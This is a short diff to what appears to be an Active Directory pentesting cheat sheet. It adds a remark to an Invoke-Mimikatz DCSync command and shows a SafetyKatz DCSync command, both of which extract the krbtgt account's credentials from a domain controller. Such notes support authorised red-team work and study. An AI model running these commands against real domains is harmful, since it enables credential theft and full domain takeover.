@@ -182,7 +182,7 @@ Rubeus.exe diamond
 
 {% code overflow="wrap" %}
 ```powershell
-Invoke-Mimikatz -command '"lsadump:dcsync /user:dom\krbtgt"'
+Invoke-Mimikatz -command '"lsadump:dcsync /user:dom\krbtgt"'  => Any account can be used/synced
 
 SafetyKatz.exe "lsadump::dcsync /user:dom\krbtgt" "exit"
 ```
